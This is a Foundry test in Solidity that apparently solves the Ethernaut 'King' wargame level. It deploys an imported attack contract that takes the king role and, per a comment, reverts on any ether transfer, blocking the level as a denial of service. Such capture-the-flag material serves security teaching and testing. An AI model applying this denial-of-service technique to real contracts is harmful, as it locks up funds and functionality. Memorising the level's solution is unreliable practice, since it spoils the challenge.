// SPDX-License-Identifier: MIT
pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "../../../src/levels/09-King/KingFactory.sol";
import "../../../src/core/Ethernaut.sol";
import "./KingAttack.sol";

contract KingTest is Test {
    Ethernaut ethernaut;
    address attacker = address(0xabcd);

    function setUp() public {
        ethernaut = new Ethernaut();
        vm.deal(attacker, 1 ether);
    }

    function testKingHack() public {
        /////////////////
        // LEVEL SETUP //
        /////////////////
        KingFactory kingFactory = new KingFactory();
        ethernaut.registerLevel(kingFactory);
        vm.startPrank(attacker);
        address levelAddress = ethernaut.createLevelInstance{
            value: 0.001 ether
        }(kingFactory);
        King ethernautKing = King(payable(levelAddress));

        //////////////////
        // LEVEL ATTACK //
        //////////////////
        // 1. deploy the attack contract
        // doesnot have fallback or receive, so will revert on any ether transfer
        // essentially like a DOS.
        KingAttack attackerContract = new KingAttack{value: 0.01 ether}(
            payable(address(ethernautKing))
        );

        // check if the attacker contract is still the king
        assertEq(ethernautKing._king(), address(attackerContract));

        //////////////////////
        // LEVEL SUBMISSION //
        //////////////////////
        bool levelSuccessfullyPassed = ethernaut.submitLevelInstance(
            payable(levelAddress)
        );
        vm.stopPrank();
        assert(levelSuccessfullyPassed);
    }
}
